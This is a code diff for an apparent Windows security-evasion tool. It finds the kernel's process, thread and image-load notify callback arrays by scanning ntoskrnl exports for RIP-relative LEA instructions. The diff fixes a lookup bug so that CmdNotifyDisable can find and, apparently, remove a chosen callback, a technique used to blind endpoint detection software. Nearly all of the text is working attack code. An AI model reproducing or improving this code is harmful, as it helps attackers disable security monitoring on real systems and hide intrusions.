@@ -34,10 +34,12 @@
 
 static inline DWORD64 DecodeRef(DWORD64 ref) { return ref & ~(DWORD64)0xF; }
 
-// Locate a Psp*NotifyRoutine array VA by scanning an exported PsRemove* function.
-// The first RIP-relative LEA in the function prologue points at the array.
+// Locate a Psp*NotifyRoutine array VA by scanning an exported function for
+// RIP-relative LEA instructions.  skipVA: skip any result equal to this kernel
+// VA (used when a function's first LEA hits a previously-found array).
 static DWORD64 FindArrayViaExport(HMODULE hNt, DWORD64 userBase, DWORD64 kernBase,
-                                  const char* exportFn, int scanBytes = 256)
+                                  const char* exportFn, DWORD64 skipVA = 0,
+                                  int scanBytes = 512)
 {
     BYTE* fn = (BYTE*)GetProcAddress(hNt, exportFn);
     if (!fn) return 0;
@@ -51,7 +53,9 @@ static DWORD64 FindArrayViaExport(HMODULE hNt, DWORD64 userBase, DWORD64 kernBas
             INT32 disp      = *(INT32*)(fn + i + 3);
             DWORD64 userTgt = (DWORD64)(fn + i + 7) + (INT64)disp;
             DWORD64 rva     = userTgt - userBase;
-            return kernBase + rva;
+            DWORD64 va      = kernBase + rva;
+            if (va == skipVA) continue;   // already found this one, keep scanning
+            return va;
         }
     }
     return 0;
@@ -137,9 +141,15 @@ void CmdNotify(bool doImage, bool doProcess, bool doThread) {
         { "CreateThread",  "PsRemoveCreateThreadNotifyRoutine",  doThread,  0 },
     };
 
-    for (auto& s : sections)
-        if (s.enabled)
-            s.arrayVA = FindArrayViaExport(hNt, userBase, kernBase, s.exportFn);
+    // Find LoadImage first; pass its VA as skipVA when scanning CreateProcess,
+    // because PsSetCreateProcessNotifyRoutineEx's first LEA may hit the same array.
+    for (auto& s : sections) {
+        if (!s.enabled) continue;
+        DWORD64 skip = 0;
+        if (strcmp(s.exportFn, "PsSetCreateProcessNotifyRoutineEx") == 0)
+            skip = sections[0].arrayVA;   // sections[0] = LoadImage, already resolved
+        s.arrayVA = FindArrayViaExport(hNt, userBase, kernBase, s.exportFn, skip);
+    }
 
     FreeLibrary(hNt);
 
@@ -189,16 +199,21 @@ void CmdNotifyDisable(unsigned long long targetFn) {
     if (!hNt) { printf("[!] Cannot load ntoskrnl.exe\n"); return; }
     DWORD64 userBase = (DWORD64)hNt;
 
-    const char* exports[] = {
+    // Resolve all three arrays up front so CreateProcess can skip LoadImage's VA.
+    const char* exportNames[] = {
         "PsRemoveLoadImageNotifyRoutine",
         "PsSetCreateProcessNotifyRoutineEx",
         "PsRemoveCreateThreadNotifyRoutine",
         nullptr
     };
+    DWORD64 arrays[3]{};
+    arrays[0] = FindArrayViaExport(hNt, userBase, kernBase, exportNames[0]);
+    arrays[1] = FindArrayViaExport(hNt, userBase, kernBase, exportNames[1], arrays[0]);
+    arrays[2] = FindArrayViaExport(hNt, userBase, kernBase, exportNames[2]);
 
     bool found = false;
-    for (int t = 0; exports[t] && !found; t++) {
-        DWORD64 arr = FindArrayViaExport(hNt, userBase, kernBase, exports[t]);
+    for (int t = 0; exportNames[t] && !found; t++) {
+        DWORD64 arr = arrays[t];
         if (!arr) continue;
 
         for (int i = 0; i < NOTIFY_MAX && !found; i++) {
